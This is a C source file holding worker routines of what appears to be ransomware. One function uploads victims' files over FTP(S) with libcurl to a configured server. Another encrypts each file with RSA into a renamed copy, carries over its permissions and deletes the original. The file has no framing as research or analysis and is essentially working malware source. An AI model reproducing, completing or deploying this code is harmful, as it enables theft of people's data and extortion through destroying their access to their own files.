#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/rsa.h"
#include "../lib/util.h"
#include "workers.h"

void upload_args_free(upload_args_t *args) {
  free(args->file);
  free(args);
}

void upload_file(void *arg) {
  upload_args_t *args = arg;
  if (NULL == args)
    return;

  char url[strlen(args->url) + strlen(args->file) + 3];
  join(url, args->url, args->file);
  replace(url, ' ', '_');

  char creds[strlen(args->user) + strlen(args->pwd) + 3];
  sprintf(creds, "%s:%s", args->user, args->pwd);

  CURL *curl = curl_easy_init();
  FILE *fp   = fopen(args->file, "r");

  if (NULL == fp) {
    debug("Failed to open the file: %s", args->file);
    goto UPLOAD_CLEAN;
  }

  if (NULL == curl) {
    debug("Failed to init curl for file: %s", args->file);
    goto UPLOAD_CLEAN;
  }

  debug("Uploading to FTP(S): %s", url);
  curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
  curl_easy_setopt(curl, CURLOPT_USERPWD, creds);
  curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_READDATA, fp);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK)
    error("Failed to upload %s: %s", args->file, curl_easy_strerror(res));

UPLOAD_CLEAN:
  curl_easy_cleanup(curl);
  upload_args_free(args);
  fclose(fp);
}

void encrypt_args_free(encrypt_args_t *args) {
  free(args->file);
  free(args->st);
  free(args);
}

void encrypt_file(void *arg) {
  encrypt_args_t *args = arg;

  EVP_PKEY_CTX *ctx = NULL;

  unsigned char in_buf[INPUT_SIZE];
  unsigned char out_buf[OUTPUT_SIZE];

  size_t in_len  = 0;
  size_t out_len = 0;

  bool ok = false;

  char *in_file = args->file;
  char  out_file[strlen(in_file) + strlen(args->ext) + 2];

  sprintf(out_file, "%s.%s", in_file, args->ext);
  FILE *in  = fopen(in_file, "r");
  FILE *out = fopen(out_file, "a");

  if (NULL == in || NULL == out) {
    debug("Failed to open in/out: %s", in_file);
    goto ENCRYPT_CLEAN;
  }

  ctx = rsa_encrypt_init();
  if (NULL == ctx) {
    debug("Failed to create ctx: %s", in_file);
    goto ENCRYPT_CLEAN;
  }

  while ((in_len = fread(in_buf, 1, INPUT_SIZE, in)) > 0) {
    out_len = OUTPUT_SIZE;
    if (!rsa_encrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
      debug("Failed to encrypt: %s (%lu -> %lu)", in_file, in_len, out_len);
      goto ENCRYPT_CLEAN;
    }

    if (fwrite(out_buf, 1, out_len, out) <= 0) {
      debug("Failed to write output: %s", in_file);
      goto ENCRYPT_CLEAN;
    }

    if (in_len < INPUT_SIZE)
      break;
  }

  if (!copy_stat(fileno(out), args->st)) {
    debug("Failed to copy perms: %s", in_file);
    goto ENCRYPT_CLEAN;
  }

  if (unlink(in_file) < 0) {
    debug("(%s) Failed to unlink: %s", in_file);
    goto ENCRYPT_CLEAN;
  }

  ok = true;

ENCRYPT_CLEAN:
  if (NULL != ctx)
    rsa_encrypt_free(ctx);

  if (NULL != in)
    fclose(in);

  if (NULL != out)
    fclose(out);

  if (!ok) {
    error("Failed to encrypt file: %s", in_file);
    unlink(out_file);
  }

  encrypt_args_free(args);
}
